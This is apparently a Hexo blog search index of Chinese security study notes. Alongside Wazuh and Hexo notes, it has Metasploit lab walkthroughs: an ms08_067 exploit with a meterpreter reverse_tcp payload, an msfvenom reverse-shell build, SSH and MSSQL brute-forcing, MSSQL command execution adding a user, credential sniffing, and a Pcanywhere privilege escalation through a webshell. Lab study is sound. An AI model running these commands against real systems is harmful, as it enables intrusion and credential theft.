<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>代码审计模块</title>
      <link href="/2024/04/18/dai-ma-shen-ji-mo-kuai/"/>
      <url>/2024/04/18/dai-ma-shen-ji-mo-kuai/</url>
      
        <content type="html"><![CDATA[<h1 id="代码审计工具介绍"><a href="#代码审计工具介绍" class="headerlink" title="代码审计工具介绍"></a>代码审计工具介绍</h1><p>*常见代码审计工具汇总<br><a href="https://www.jianshu.com/p/5158ac2de64b">https://www.jianshu.com/p/5158ac2de64b</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>个人知识仓库</title>
      <link href="/2024/04/18/ge-ren-zhi-shi-cang-ku/"/>
      <url>/2024/04/18/ge-ren-zhi-shi-cang-ku/</url>
      
        <content type="html"><![CDATA[<h1 id="个人知识仓库"><a href="#个人知识仓库" class="headerlink" title="个人知识仓库"></a>个人知识仓库</h1><ul><li>有很多值得看的东西，健身、思考等<br><a href="https://www.hubermantranscripts.com/post/0098_q1Ss8sTbFBY">https://www.hubermantranscripts.com/post/0098_q1Ss8sTbFBY</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 充电 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 知识 </tag>
            
            <tag> 充电 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试工具集</title>
      <link href="/2024/04/18/shen-tou-ce-shi-gong-ju-ji/"/>
      <url>/2024/04/18/shen-tou-ce-shi-gong-ju-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="渗透测试工具集"><a href="#渗透测试工具集" class="headerlink" title="渗透测试工具集"></a>渗透测试工具集</h1><h2 id="TscanPlus"><a href="#TscanPlus" class="headerlink" title="TscanPlus"></a>TscanPlus</h2><p>一款综合性网络安全检测和运维工具，旨在快速资产发现、识别、检测，构建基础资产信息库，协助甲方安全团队或者安全运维人员有效侦察和检索资产，发现存在的薄弱点和攻击面。<br><a href="https://github.com/TideSec/TscanPlus">https://github.com/TideSec/TscanPlus</a></p><h2 id="QuadraInspect"><a href="#QuadraInspect" class="headerlink" title="QuadraInspect"></a>QuadraInspect</h2><p>QuadraInspect 是一个集成了 AndroPass、APKUtil 和 MobFS 的 Android 框架，为分析 Android 应用程序的安全性提供了强大的工具。<br><a href="https://github.com/morpheuslord/QuadraInspect">https://github.com/morpheuslord/QuadraInspect</a></p><h2 id="w13scan"><a href="#w13scan" class="headerlink" title="w13scan"></a>w13scan</h2><p>Passive Security Scanner (被动式安全扫描器)<br><a href="https://github.com/w-digital-scanner/w13scan">https://github.com/w-digital-scanner/w13scan</a></p><h2 id="mobsf"><a href="#mobsf" class="headerlink" title="mobsf"></a>mobsf</h2><p>移动端扫描器<br><a href="https://mobsf.github.io/docs/#/zh-cn/mobsf_docker">https://mobsf.github.io/docs/#/zh-cn/mobsf_docker</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试在线网站</title>
      <link href="/2024/04/18/shen-tou-ce-shi-zai-xian-wang-zhan/"/>
      <url>/2024/04/18/shen-tou-ce-shi-zai-xian-wang-zhan/</url>
      
        <content type="html"><![CDATA[<h1 id="渗透测试中的在线工具网站"><a href="#渗透测试中的在线工具网站" class="headerlink" title="渗透测试中的在线工具网站"></a>渗透测试中的在线工具网站</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ul><li>查找网站的信息</li></ul><pre><code>https://web-check.as93.net/![alt text](image.png)github地址：https://github.com/Lissy93/web-check</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>保存的AI好文链接</title>
      <link href="/2024/04/18/bao-cun-de-ai-hao-wen-lian-jie/"/>
      <url>/2024/04/18/bao-cun-de-ai-hao-wen-lian-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="存着的链接"><a href="#存着的链接" class="headerlink" title="存着的链接"></a>存着的链接</h1><ul><li><p>大师级对话：<br>&lt;黄仁勋对话 Transformer ：大模型的起源、现在和未来&gt;<br><a href="https://www.jnexpert.com/article/detail?id=8140">https://www.jnexpert.com/article/detail?id=8140</a></p></li><li><p>ai 模型</p><p>  <a href="https://github.com/SakanaAI/evolutionary-model-merge">https://github.com/SakanaAI/evolutionary-model-merge</a></p><p>  <a href="https://github.com/princeton-nlp/SWE-agent">https://github.com/princeton-nlp/SWE-agent</a></p><p>  <a href="https://github.com/GreyDGL/PentestGPT?tab=readme-ov-file">https://github.com/GreyDGL/PentestGPT?tab=readme-ov-file</a></p><p>  <a href="https://github.com/OpenBMB/ChatDev">https://github.com/OpenBMB/ChatDev</a></p><p>  <a href="https://github.com/ollama/ollama">https://github.com/ollama/ollama</a><br>  它对应的有大模型选择，地址为：<a href="https://ollama.com/library">https://ollama.com/library</a></p><p>  在线生成音乐：<a href="https://suno.com/">https://suno.com/</a></p><p>  马斯克开放的大模型，grok-1，还有能操作矢量数据库的<br>  <a href="https://github.com/xai-org">https://github.com/xai-org</a></p></li><li><p>ai知识了解</p><ul><li>机器学习模型训练全流程！<br>  <a href="https://zhuanlan.zhihu.com/p/183180885">https://zhuanlan.zhihu.com/p/183180885</a></li><li>面向不同领域的AI Agent能做什么？十大领域30个AI智能体为你解谜<br>  <a href="https://m.ofweek.com/ai/2023-11/ART-201700-8420-30615605.html">https://m.ofweek.com/ai/2023-11/ART-201700-8420-30615605.html</a></li></ul></li><li><p>ai安全</p><ul><li>ai在安全上的产品，概念级<br>  <a href="https://www.symmetry-systems.com/">https://www.symmetry-systems.com/</a></li><li>可以训练ai的数据<br>  <a href="https://github.com/shramos/Awesome-Cybersecurity-Datasets">https://github.com/shramos/Awesome-Cybersecurity-Datasets</a></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> AI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ai </tag>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wazuh系列</title>
      <link href="/2024/04/17/wazuh-xi-lie/"/>
      <url>/2024/04/17/wazuh-xi-lie/</url>
      
        <content type="html"><![CDATA[<h1 id="wazuh的安装"><a href="#wazuh的安装" class="headerlink" title="wazuh的安装"></a>wazuh的安装</h1><p>有一键安装和分布式安装，参考wazuh官网操作链接：<br><a href="https://documentation.wazuh.com/current/quickstart.html">https://documentation.wazuh.com/current/quickstart.html</a></p><h1 id="功能记录"><a href="#功能记录" class="headerlink" title="功能记录"></a>功能记录</h1><ul><li><p>   重启服务器：systemctl restart wazuh-manager<br>echo &gt;/var/ossec/logs/ossec.log &amp;&amp; systemctl restart wazuh-manager &amp; tail -f /var/ossec/logs/ossec.log</p></li><li><p>   Angen服务器上Audit日志路径：/var/log/audit/audit.log</p></li><li><p>   配置规则，服务端上规则文件路径：/var/ossec/etc/rules/local_rules.xml</p></li><li><p>   服务器上配置文件的路径：/var/ossec/etc/ossec.conf</p></li><li><p>   服务器上原始json日志路径：/var/ossec/logs/archives/archives.json</p></li><li><p>   服务器上清空日志并查看加载情况：<br>echo &gt;/var/ossec/logs/ossec.log &amp;&amp; systemctl restart wazuh-manager &amp; tail -f 50 /var/ossec/logs/ossec.log</p></li><li><p>   重启所有服务：</p></li><li><p>重启wazuh的agent，并查看启动日志：echo &gt; /var/ossec/logs/ossec.log &amp;&amp; systemctl restart wazuh-agent.service &amp; tail -f 50 /var/ossec/logs/ossec.log</p></li><li><p>自定义规则的写入路径，写到wazuh自带规则的路径下时，在更新后会覆盖删除自写规则：<br>/var/ossec/etc/rules/local_rules.xml</p></li><li><p>修改wazuh服务器本身的配置，使发送过来的日志都能记录下来：<br>vim /var/ossec/etc/ossec.conf</p><ul><li>修改：  <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;logall&gt;yes&lt;/logall&gt; </span><br><span class="line">&lt;logall_json&gt;yes&lt;/logall_json&gt;</span><br></pre></td></tr></tbody></table></figure></li><li>修改完后，对应的记录文件为：</li><li>   文本格式记录 (<logall>yes</logall>):</li><li>   路径：/var/ossec/logs/archives/archives.log</li><li>   这个文件包含所有通过Wazuh agent收集并由Wazuh manager处理的事件的文本记录。</li><li>   JSON格式记录 (<logall_json>yes</logall_json>):</li><li>   路径：/var/ossec/logs/archives/archives.json</li><li>   类似于 archives.log，但信息以JSON格式存储，适用于需要进行机器处理或分析的场合。</li></ul></li><li><p>修改完后，在本地测试规则是否符合预期，wazuh自带了测试工具：</p></li></ul><h1 id="管理日志文件大小"><a href="#管理日志文件大小" class="headerlink" title="管理日志文件大小"></a>管理日志文件大小</h1><p>由于 <logall> 和 <logall_json> 可能会生成大量数据，考虑设置日志轮换和压缩来管理日志文件大小。Wazuh已经有内置的日志轮换机制，但你也可以根据需要调整相关设置，比如通过编辑 /var/ossec/etc/internal_options.conf 文件来调整轮换的频率和保留的日志文件数量。<br>确保监视这些日志文件的大小，以防止它们消耗过多的磁盘空间，可能会影响系统性能和稳定性。</logall_json></logall></p><h1 id="对agent进行功能配置的方式"><a href="#对agent进行功能配置的方式" class="headerlink" title="对agent进行功能配置的方式"></a>对agent进行功能配置的方式</h1><p>wazuh针对主机安全的功能开启和关闭基本都在agent上进行配置，功能都需要配置后开启，没有一键安装使用功能<br>针对配置文件的更改，wazuh提供了两种方式，集中配置和本地配置，本地配置需要在每个agent上进行更改，集中配置可在服务端配置完成后，客户端会同步配置文件，按照配置文件的优先级来生效。<br>集中配置时需要在agent上开启一个功能，开启后agent可以执行服务端传过来的配置，也可以执行命令，权限较大，此功能默认关闭<br>在/var/ossec/etc/local_internal_options.conf上增加配置：wazuh_command.remote_commands=1</p><h1 id="设置监控linux是否有外网权限的功能"><a href="#设置监控linux是否有外网权限的功能" class="headerlink" title="设置监控linux是否有外网权限的功能"></a>设置监控linux是否有外网权限的功能</h1><ul><li>linux主机日志：<br>/var/log/messages</li></ul>]]></content>
      
      
      <categories>
          
          <category> 基础安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wazuh </tag>
            
            <tag> 基础安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo更新升级</title>
      <link href="/2024/04/17/hexo-geng-xin-sheng-ji/"/>
      <url>/2024/04/17/hexo-geng-xin-sheng-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="Hexo升级指南"><a href="#Hexo升级指南" class="headerlink" title="Hexo升级指南"></a>Hexo升级指南</h1><ol><li>全局升级hexo-cli，先<code>hexo version</code>查看当前版本，然后<code>npm install -g hexo-cli</code>，再次<code>hexo version</code>查看是否升级成功。如果hexo不能直接识别运行，改为<code>npx hexo</code>。</li><li>使用<code>npm-check</code>，检查系统中的插件是否有升级的。</li><li>使用<code>npm-upgrade</code>，升级系统中的相关插件。</li><li><code>npm update -g</code>，检查升级npm本身。</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br><span class="line">hexo version</span><br><span class="line"></span><br><span class="line">npm install -g npm-check</span><br><span class="line">npm-check</span><br><span class="line"></span><br><span class="line">npm install -g npm-upgrade</span><br><span class="line">npm-upgrade</span><br><span class="line"></span><br><span class="line">npm update -g</span><br><span class="line">npm install -g npm</span><br><span class="line"></span><br><span class="line">hexo clean #清理hexo数据并重新生成页面并部署</span><br><span class="line">hexo g -s</span><br><span class="line">hexo d</span><br></pre></td></tr></tbody></table></figure><h1 id="Hexo打开评论功能"><a href="#Hexo打开评论功能" class="headerlink" title="Hexo打开评论功能"></a>Hexo打开评论功能</h1><p>直接贴链接<br><a href="https://www.cnblogs.com/guoapeng/p/17627621.html">https://www.cnblogs.com/guoapeng/p/17627621.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 鼓捣博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> 升级 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/04/17/an-zhuang-md-bian-ji-qi/"/>
      <url>/2024/04/17/an-zhuang-md-bian-ji-qi/</url>
      
        <content type="html"><![CDATA[<h1 id="安装MD编辑器"><a href="#安装MD编辑器" class="headerlink" title="安装MD编辑器"></a>安装MD编辑器</h1><p>推荐两款MD编辑器，MarkdownPad 2和Typora，还有个印象笔记，用着也不错</p><ul><li>MarkdownPad 2下载地址：</li></ul><blockquote><p><a href="http://www.markdownpad.com/">http://www.markdownpad.com/</a></p></blockquote><ul><li>Typora下载地址：</li></ul><blockquote><p><a href="https://typora.io/#windows">https://typora.io/#windows</a></p></blockquote><p>MarkdownPad 2下载安装打开后若出现如下画面：</p><p><img src="/.io//ss.png"></p><p>还需要安装一个程序awesomium，markdown官网下载，下载链接如下：</p><blockquote><p><a href="https://markdownpad.com/download/awesomium_v1.6.6_sdk_win.exe">https://markdownpad.com/download/awesomium_v1.6.6_sdk_win.exe</a></p></blockquote><p>Typora和印象笔记有中文版的，刚接触MD编辑的，还是推荐使用这两个。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/04/17/msf/msf-xin-xi-shou-ji-bu-ding-cha-zhao/"/>
      <url>/2024/04/17/msf/msf-xin-xi-shou-ji-bu-ding-cha-zhao/</url>
      
        <content type="html"><![CDATA[<p>msf信息收集–补丁查找</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Windows缺少的补丁</span><br><span class="line">– 基于已经获取到的session进行检测</span><br><span class="line">– use post/windows/gather/enum_patches </span><br><span class="line">▪ show advanced</span><br><span class="line">▪ set VERBOSE yes</span><br><span class="line">– 检查失败</span><br><span class="line">▪ Known bug in WMI query, try migrating to another process</span><br><span class="line">▪ 迁移到另一个进程再次尝试（也就是进程注入migrating）</span><br></pre></td></tr></tbody></table></figure><p>ms08_067在初次使用不成功以后，需要重启靶机电脑，因为它会打乱电脑的一些设置，导致后面再试的时候会不成功</p><p><strong>ms08_067   KB958644</strong></p><p>Windows缺少的补丁<br>– 基于已经获取到的session进行检测<br>– use post/windows/gather/enum_patches<br>▪ show advanced<br>▪ set VERBOSE yes<br>– 检查失败<br>▪ Known bug in WMI query, try migrating to another process<br>▪ 迁移到另一个进程再次尝试（也就是进程注入migrating）</p><p>use exploit/windows/smb/ms08_067_netapi<br>set rhosts 192.168.88.131<br>set payload windows/meterpreter/reverse_tcp<br>set lhost 192.168.88.130<br>run<br>(若有该漏洞，则会执行成功)<br>（注意到payload的使用位置了么）</p><p>因为没有机器，所以自己制作了一个peyload使用一下</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.88.130 lport=55555 -f exe -o /root/Desktop/leetest/123.exe</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">set payload windows/x64/meterpreter_reverse_tcp</span><br><span class="line"></span><br><span class="line">run -j -z</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="/.io//25fad61d3b884dfb99b2b99dabcac1f0.png" alt="093804844b494b1810107285bbe9caf9.png"></p><p>回到模块，继续进行</p><p><img src="/.io//4b35799ecdcf4673b830cbbca22deebf.png" alt="7f9b2af956637b185b48c05c8a9730c4.png"></p><p>显示信息用提示的是因为缺少这些补丁，所以后面的那些ms也许可以利用</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/04/17/msf/msf-xin-xi-shou-ji-duan-kou-sao-miao-2/"/>
      <url>/2024/04/17/msf/msf-xin-xi-shou-ji-duan-kou-sao-miao-2/</url>
      
        <content type="html"><![CDATA[<p>msf信息收集–端口扫描2</p><h2 id="idle扫描"><a href="#idle扫描" class="headerlink" title="idle扫描"></a>idle扫描</h2><p>use auxiliary/scanner/ip/ipidseq<br>查找出来以后，就可以进行idle主机扫描<br>nmap -PN -sI 1.1.1.2 1.1.1.3</p><p><img src="/.io//645fe527b1944a30b23a503bb31c3a8a.png" alt="Image.png"></p><p>上面的结果是没有扫描出来idle主机</p><h2 id="UDP扫描"><a href="#UDP扫描" class="headerlink" title="UDP扫描"></a>UDP扫描</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/udp_sweep</span><br><span class="line">use auxiliary/scanner/discovery/udp_probe</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/04/17/msf/msf-xin-xi-shou-ji-fa-xian-he-duan-kou-sao-miao/"/>
      <url>/2024/04/17/msf/msf-xin-xi-shou-ji-fa-xian-he-duan-kou-sao-miao/</url>
      
        <content type="html"><![CDATA[<p>msf信息收集–发现和端口扫描</p><p>kali机：192.168.1.5<br>centos6机：192.168.1.6</p><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p>开启postgresql<br><code>root@kali:~# service postgresql start</code></p><p>打开msfconsole<br>使用db_nmap扫描c网段：<br><code>db_nmap -sV 192.168.1.0/24</code><br>最后会扫出来本网段的机子<br>使用hosts查看机子</p><p><img src="/.io//c76aa817717f42bcb807082268b0e569.png" alt="41915a60cd2de31565c5949b413245bd.png"></p><p>使用arp_sweep扫描发现<br><code>msf5 &gt; use auxiliary/scanner/discovery/arp_sweep</code></p><p>设置扫描网段，设置线程数<br>网段也可以设置为一下格式<br><code>192.168.1.20-192.168.1.30</code></p><p><code>msf5 auxiliary(scanner/discovery/arp_sweep) &gt; set rhosts 192.168.1.0/24 rhosts =&gt; 192.168.1.0/24 msf5 auxiliary(scanner/discovery/arp_sweep) &gt; set threads 20 threads =&gt; 20 </code></p><p><img src="/.io//3aaaef98414e474abff3d2cf63206b96.png" alt="e910c694ce6c08f747a39fdd3f96bb95.png"></p><p>使用hosts查看扫描出来的主机列表</p><p><img src="/.io//586e5b21bbdb4f7d98b23b84c2e998a3.png" alt="1b557ef53dd142cae420b8fc7ec4d884.png"></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>使用portscan模块，里面有很多模块，选择一个进行测试<br><code>use auxiliary/scanner/portscan/syn</code></p><p>设置目标主机，要扫描端口，线程数</p><p><img src="/.io//48ac62deaecc4c0db92addc70916d032.png" alt="df85749042e07599e721c9ee667d6cc9.png"></p><p><code>run</code></p><p><img src="/.io//cb35aac6b0ae43709d90f38a291eb5db.png" alt="0f6fdb4ed3cbf42b5018482259f6be32.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/04/17/msf/msf-xin-xi-shou-ji-smb-ssh/"/>
      <url>/2024/04/17/msf/msf-xin-xi-shou-ji-smb-ssh/</url>
      
        <content type="html"><![CDATA[<p>msf信息收集–smb+ssh</p><p>kali:192.168.88.130<br>靶机：192.168.88.129</p><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p>概括：<br><code> SMB版本扫描 – use auxiliary/scanner/smb/smb_version 扫描命名管道，判断smb服务类型（账号、密码） – use auxiliary/scanner/smb/pipe_auditor ٔ扫描通过SMB管道可以访问的RCRPC服务 – use auxiliary/scanner/smb/pipe_dcerpc_auditor SMB共享枚举（账号、密码） – use auxiliary/scanner/smb/smb_enumshares SMB用户枚举（账号、密码） – use auxiliary/scanner/smb/smb_enumusers SID枚举（账号、密码） – use auxiliary/scanner/smb/smb_lookupsid</code></p><h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">▪ SSH 版本扫描</span><br><span class="line">– use auxiliary/scanner/ssh/ssh_version</span><br><span class="line">▪ SSH密码爆破</span><br><span class="line">– use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">    ▪ set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/</span><br><span class="line">root_userpass.txt;set VERBOSE false;run</span><br><span class="line">▪ SSH公匙登陆</span><br><span class="line">– use auxiliary/scanner/ssh/ssh_login_pubkey</span><br><span class="line">▪ set KEY_FILE id_rsa; set USERNAME root;run</span><br></pre></td></tr></tbody></table></figure><h3 id="SMB-1"><a href="#SMB-1" class="headerlink" title="SMB"></a>SMB</h3><ul><li>use auxiliary/scanner/smb/smb_version</li></ul><p>若有账号密码可以加进去，扫描结果会更准确</p><p><img src="/.io//efa0795faec64aaba7657422b0a8c017.png" alt="43fbff6f077fb9b2ac44c439d9ae5ba1.png"></p><ul><li>use auxiliary/scanner/smb/pipe_auditor</li></ul><p>若有账号密码可以加进去，扫描结果会更准确</p><p><img src="/.io//559a67ab9d5e4022b719177d8a4d8a2a.png" alt="c875c46d343cf3e17a9bfcea198e804d.png"></p><p>这里几个没有结果，需要添加用户密码<br>ٔ扫描通过SMB管道可以访问的RCRPC服务</p><ul><li>use auxiliary/scanner/smb/pipe_dcerpc_auditor</li></ul><p>SMB共享枚举（账号、密码）</p><ul><li>use auxiliary/scanner/smb/smb_enumshares<br>SMB用户枚举（账号、密码）</li><li>use auxiliary/scanner/smb/smb_enumusers</li></ul><p>SID枚举（账号、密码）</p><ul><li>use auxiliary/scanner/smb/smb_lookupsid</li></ul><p><img src="/.io//08b91f6368f6472b965fbefb2a6785f6.png" alt="443231a278bdb0289d1221de3d2987d6.png"></p><h3 id="SSH-1"><a href="#SSH-1" class="headerlink" title="SSH"></a>SSH</h3><p>ssh的1和1.99版本有漏洞</p><p>▪ SSH 版本扫描<br>– use auxiliary/scanner/ssh/ssh_version</p><p><img src="/.io//6d5aa58d396b4335b89db210f3f074da.png" alt="568edf5cd88aa5e910cda77669b11c72.png"></p><p>▪ SSH密码爆破<br>– use auxiliary/scanner/ssh/ssh_login<br>    ▪ set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/<br>root_userpass.txt;set VERBOSE false;run<br>向文件中添加一个自己的账户密码，这里做的是演示<br>vim /usr/share/metasploit-framework/data/wordlists/root_userpass.txt</p><p><img src="/.io//299ccf9c691f4785a196983b5affbf7b.png" alt="82db61e367f9b7575a6620bb8e19030d.png"></p><p>▪ SSH公匙登陆<br>– use auxiliary/scanner/ssh/ssh_login_pubkey<br>▪ set KEY_FILE id_rsa; set USERNAME root;run<br>这里有一些硬件出厂使用的相同的默认密钥文件，可以下载下来，然后寻找使用相同密钥设备的文件</p><p><img src="/.io//5c12f909b8e940a9b99774a2eae5fe33.png" alt="5e37d5bd4ca00eef3dfcf1f9dc19304a.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/04/17/msf/msf-xin-xi-shou-ji-mssql-ftp/"/>
      <url>/2024/04/17/msf/msf-xin-xi-shou-ji-mssql-ftp/</url>
      
        <content type="html"><![CDATA[<p>msf信息收集–mssql+ftp</p><h2 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">▪ Mssql扫描端口</span><br><span class="line">– TCP 1433 （动态端口）/ UDP 1434 （查询TCP端口号）</span><br><span class="line">– use auxiliary/scanner/mssql/mssql_ping </span><br><span class="line">▪ 爆破mssql密码</span><br><span class="line">– use auxiliary/scanner/mssql/mssql_login</span><br><span class="line">▪ 远程执行代码</span><br><span class="line">– use auxiliary/admin/mssql/mssql_exec</span><br><span class="line">– set CMD net user user pass /ADD</span><br></pre></td></tr></tbody></table></figure><h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">▪ FTP 版本扫描</span><br><span class="line">– use auxiliary/scanner/ftp/ftp_version</span><br><span class="line">– use auxiliary/scanner/ftp/anonymous</span><br><span class="line">– use auxiliary/scanner/ftp/ftp_login</span><br><span class="line">▪ use auxiliary/scanner/ [tab]</span><br><span class="line">– Display all 479 possibilities? (y or n)</span><br></pre></td></tr></tbody></table></figure><h3 id="mssql-1"><a href="#mssql-1" class="headerlink" title="mssql"></a>mssql</h3><p>▪ Mssql扫描端口<br>– TCP 1433 （动态端口）/ UDP 1434 （查询TCP端口号）<br>– use auxiliary/scanner/mssql/mssql_ping<br>▪ 爆破mssql密码<br>– use auxiliary/scanner/mssql/mssql_login<br>▪ 远程执行代码<br>– use auxiliary/admin/mssql/mssql_exec<br>– set CMD net user user pass /ADD</p><h3 id="ftp-1"><a href="#ftp-1" class="headerlink" title="ftp"></a>ftp</h3><p>▪ FTP 版本扫描<br>– use auxiliary/scanner/ftp/ftp_version</p><p><img src="/.io//0cdc26d899664cdfa1ffda6f35e31ffc.png" alt="be4f5f36b0d3fa364dab551350e925cb.png"></p><p>– use auxiliary/scanner/ftp/anonymous</p><p><img src="/.io//86d9f4a13a114931b761b9d986f585a3.png" alt="2df9f491f53dc000d3f2d73d331428c9.png"></p><p>– use auxiliary/scanner/ftp/ftp_login<br>▪ use auxiliary/scanner/ [tab]<br>– Display all 479 possibilities? (y or n)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/04/17/msf/msf-cong-qi-ta-gong-ju-zhong-zhua-qu-xin-xi/"/>
      <url>/2024/04/17/msf/msf-cong-qi-ta-gong-ju-zhong-zhua-qu-xin-xi/</url>
      
        <content type="html"><![CDATA[<p>msf从其他工具中抓取信息</p><p>从抓包文件中读取账号密码<br>支持从pcap抓包文件中提取密码<br>支持pop3\imap\ftp\http get协议</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/sniffer/psnuffle</span><br></pre></td></tr></tbody></table></figure><p><img src="/.io//556f9732703743be8c7bc10c73f8c8a2.png" alt="de2924a5dc7631749087c65ffa22a94e.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/04/17/005-shi-yan-pcanywhere/"/>
      <url>/2024/04/17/005-shi-yan-pcanywhere/</url>
      
        <content type="html"><![CDATA[<p>005 实验-Pcanywhere</p><h2 id="Contents"><a href="#Contents" class="headerlink" title="Contents"></a>Contents</h2><ul><li><a href="">Contents</a></li><li><a href="">题目</a></li><li><a href="">过程</a></li></ul><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>利用第三放服务（Pcanywhere）提升权限的方法<br><img src="/.io//f71ff1bf4a88863bf2ae2b1b7e4be3fc.png"></p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><ol><li>在实验中访问<a href="http://172.16.12.2/index.php%EF%BC%8C%E6%88%90%E5%8A%9F%E8%BF%9E%E6%8E%A5%E5%88%B0webshell">http://172.16.12.2/index.php，成功连接到webshell</a><br><img src="/.io//9e0585aaae6b73fafe42d13548d3c58e.png"><br><img src="/.io//eb1faf6b71fb6a15f8a035cc31f8fa4b.png"></li><li>分析该服务器端口服务<br><img src="/.io//e89f4fe707173434a518223cf5fa3f0f.png"><br>5631端口是开启的，是pcanywhere服务</li><li>去找pcanywhere的密码存储的文件<br><img src="/.io//2df63b4545ba7f06ed12170ebb12d714.png"><br>该文件一般是以.CIF为后缀名，本环境中的密码文件为：PCA.test.CIF<br>下载该文件</li><li>获取账号密码<br><img src="/.io//1f2d53e8a2598347cf39f27b81268637.png"></li><li>用pcanywhere登录<br><img src="/.io//085c38112cc00ff46e02e436f8fb1f6e.png"><br>打开这个刚创建的新主控端<br><img src="/.io//ca987d1cda571894be1494a4176ed5dd.png"><br>输入账号密码<br><img src="/.io//fe1ac9f4ba009b99582c9066ab37cbf6.png"><br>连接上了，屏幕是花的<br><img src="/.io//a3aeb7419a97a84ee411610a712883ad.png"><br>反正成功了</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/04/17/004-shi-yan-pr-ti-quan/"/>
